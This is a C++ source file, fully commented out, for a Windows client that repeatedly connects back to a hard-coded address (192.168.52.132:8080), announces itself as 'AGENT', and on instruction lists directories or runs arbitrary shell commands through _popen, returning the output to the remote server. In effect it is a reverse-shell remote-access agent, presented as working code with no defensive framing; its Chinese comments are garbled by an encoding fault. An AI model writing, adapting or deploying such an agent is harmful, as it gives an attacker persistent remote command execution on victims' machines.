//#include <iostream>
//#include <winsock2.h>
//#include <ws2tcpip.h>
//#include <chrono>
//#include <filesystem>
//#include <cstdio>
//#include <memory>
//#include <stdexcept>
//#include <array>
//#include <string>
//
//using namespace std;
//namespace fs = std::filesystem;
//
//#include <thread>
//
//#pragma comment(lib, "Ws2_32.lib")
//
//#define DEFAULT_BUFLEN 512
//#define DEFAULT_PORT "8080"
//#define RECONNECT_DELAY 5000 // �����ӳ�ʱ�䣨���룩
//const std::string FILE_LIST_REQUEST_PREFIX = "LIST:";
//const std::string MESSAGE_PREFIX = "MSG:";
//const std::string COMMAND_PREFIX = "SHELL:";
//
//bool sendMessage(int sock, const std::string& message) {
//    int sentBytes = send(sock, message.c_str(), message.length(), 0);
//    if (sentBytes < 0) {
//        std::cerr << "Failed to send message." << std::endl;
//        return false;
//    }
//    return true;
//}
//
//string Listdirectory(const std::string& directory_path) {
//    try {
//        if (fs::exists(directory_path) && fs::is_directory(directory_path)) {
//            string output_info;
//            for (const auto& entry : fs::directory_iterator(directory_path)) {
//                const auto filenamestr = entry.path().filename().string();
//                if (entry.is_directory()) {
//                    output_info += "[dir]  " + filenamestr + "\n";
//                }
//                else if (entry.is_regular_file()) {
//                    output_info += "[file] " + filenamestr + "\n";
//                }
//                else {
//                    output_info += "[other] " + filenamestr + "\n";
//                }
//            }
//            return output_info;
//        }
//        else {
//            std::cout << "path does not exist or is not a directory." << std::endl;
//        }
//    }
//    catch (const fs::filesystem_error& err) {
//        std::cerr << "filesystem error: " << err.what() << std::endl;
//    }
//    catch (const std::exception& e) {
//        std::cerr << "Error: " << e.what() << std::endl;
//    }
//    return 0;
//}
//
//string execCommand(const std::string& cmd) {
//    std::array<char, 128> buffer;
//    std::string result;
//    // ʹ��popen����һ���ܵ���ִ��һ���������ȡ���
//    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
//    //std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
//    if (!pipe) {
//        throw std::runtime_error("popen() failed!");
//    }
//    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
//        result += buffer.data();
//    }
//    std::cout << "Commadn result: " << result << std::endl;
//    return result;
//}
//
//int main() {
//    WSADATA wsaData;
//    SOCKET ConnectSocket = INVALID_SOCKET;
//    struct addrinfo* result = NULL, * ptr = NULL, hints;
//    char recvbuf[DEFAULT_BUFLEN];
//    int iResult;
//    int recvbuflen = DEFAULT_BUFLEN;
//
//    // ��ʼ��Winsock
//    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
//    if (iResult != 0) {
//        std::cout << "WSAStartup failed: " << iResult << std::endl;
//        return 1;
//    }
//
//    ZeroMemory(&hints, sizeof(hints));
//    hints.ai_family = AF_UNSPEC;
//    hints.ai_socktype = SOCK_STREAM;
//    hints.ai_protocol = IPPROTO_TCP;
//
//    while (true) { // ��ѭ�� - �����������Ӻͽ�������
//        // ������������ַ�Ͷ˿�
//        iResult = getaddrinfo("192.168.52.132", DEFAULT_PORT, &hints, &result);
//        if (iResult != 0) {
//            std::cout << "getaddrinfo failed: " << iResult << std::endl;
//            WSACleanup();
//            return 1;
//        }
//
//        // �������ӵ�������
//        for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
//            // �����׽���
//            ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
//            if (ConnectSocket == INVALID_SOCKET) {
//                std::cout << "socket failed: " << WSAGetLastError() << std::endl;
//                WSACleanup();
//                return 1;
//            }
//
//            // ���ӵ�������
//            iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
//            if (iResult == SOCKET_ERROR) {
//                closesocket(ConnectSocket);
//                ConnectSocket = INVALID_SOCKET;
//                continue;
//            }
//            break;
//        }
//
//        freeaddrinfo(result);
//
//        if (ConnectSocket == INVALID_SOCKET) {
//            std::cout << "Unable to connect to server, will try again in " << RECONNECT_DELAY << "ms" << std::endl;
//            std::this_thread::sleep_for(std::chrono::milliseconds(RECONNECT_DELAY));
//            continue;
//        }
//        std::cout << "Connection successfully,Wait Messages" << std::endl;
//
//        // ���ӽ�������������"AGENT"��ʶ
//        if (!sendMessage(ConnectSocket, "AGENT")) {
//            closesocket(ConnectSocket);
//            return -1;
//        }
//        // ��������ѭ��
//        while (true) {
//            iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
//            if (iResult > 0) {
//                std::cout << "Bytes received: " << iResult << std::endl;
//                string message = std::string(recvbuf, 0, iResult);
//                std::cout << "Message: " << message << std::endl;
//                if (message.compare(0, FILE_LIST_REQUEST_PREFIX.length(), FILE_LIST_REQUEST_PREFIX) == 0) {
//                    // �����ļ��б�����
//                    string directory_path = message.substr(FILE_LIST_REQUEST_PREFIX.length());
//                    string files_message=Listdirectory(directory_path);
//                    sendMessage(ConnectSocket, files_message);
//                }
//                if (message.compare(0, COMMAND_PREFIX.length(), COMMAND_PREFIX) == 0) {
//                    std::cout << "Command done~ " << std::endl;
//                    string CC = message.substr(COMMAND_PREFIX.length());
//                    string files_message = execCommand(CC);
//                    sendMessage(ConnectSocket, files_message);
//                }
//               // // �����ط����յ�������
//               //// ����һ���㹻����ַ���������������ǰ׺�����յ�����Ϣ�ͽ�����
//                const char* prefix = "agent sent: ";
//                int prefixLength = strlen(prefix);
//                int messageLength = prefixLength + iResult;
//                char* messageToSend = new char[messageLength + 1]; // +1 for the null terminator
//
//                // Copying prefix and received message into the new buffer
//                strcpy_s(messageToSend, messageLength + 1, prefix);
//                // �ֶ�׷�ӽ��յ������ݵ� messageToSend
//                memcpy(messageToSend + prefixLength, recvbuf, iResult);  // �� prefix ��ʼ����
//
//                messageToSend[messageLength] = '\0';  // ȷ���ַ�����ȷ����
//
//
//                // �ط��޸ĺ����Ϣ
//                int iSendResult = send(ConnectSocket, messageToSend, strlen(messageToSend), 0); // -1 ������������'0'
//                if (iSendResult == SOCKET_ERROR) {
//                    std::cout << "send failed: " << WSAGetLastError() << std::endl;
//                    delete[] messageToSend; // �ͷŶ�̬������ڴ�
//                    break;
//                }
//                std::cout << "Bytes sent: " << iSendResult << std::endl;
//
//                delete[] messageToSend; // �ͷŶ�̬������ڴ�
//            }
//            else if (iResult == 0) {
//                std::cout << "Connection closed" << std::endl;
//                break; // �������պͷ���ѭ�����ر��׽���
//            }
//            else {
//                std::cout << "recv failed: " << WSAGetLastError() << std::endl;
//                break; // �������պͷ���ѭ�����ر��׽���
//            }
//            // ���������������ʱ��������Ϣ�Ļط��ٶȣ������Ҫ�Ļ�
//        }
//        // �ر��׽���
//        closesocket(ConnectSocket);
//        ConnectSocket = INVALID_SOCKET; // �����׽���
//
//        // �ȴ�һ��ʱ�����������
//        std::cout << "Will try to reconnect in " << RECONNECT_DELAY << "ms" << std::endl;
//        std::this_thread::sleep_for(std::chrono::milliseconds(RECONNECT_DELAY));
//    }
//
//    // ����Winsock
//    WSACleanup();
//
//    return 0;
//}
